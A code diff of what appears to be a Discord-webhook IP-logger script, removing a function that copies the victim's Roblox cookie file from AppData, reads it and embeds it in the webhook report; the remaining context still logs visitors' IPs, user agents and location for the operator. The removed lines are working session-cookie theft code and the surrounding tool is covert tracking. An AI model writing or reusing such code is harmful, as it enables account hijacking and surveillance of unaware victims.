@@ -67,27 +67,6 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better
 
-def retrieve_roblox_cookies():
-    try:
-        user_profile = os.getenv("USERPROFILE", "")
-        roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-        if not os.path.exists(roblox_cookies_path):
-            return None
-        
-        temp_dir = os.getenv("TEMP", "")
-        destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-        shutil.copy(roblox_cookies_path, destination_path)
-
-        with open(destination_path, 'r', encoding='utf-8') as file:
-            file_content = file.read()
-            return file_content
-                
-    except Exception as e:
-        return f"Error retrieving cookies: {str(e)}"
-    
-    return None
-
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -161,8 +140,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
 
-    roblox_cookies = retrieve_roblox_cookies()
-
     embed = {
     "username": config["username"],
     "content": ping,
@@ -194,7 +171,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **User Agent:**
 ```
 
-{roblox_cookies}
+{useragent}
 ```""",
     }
   ],
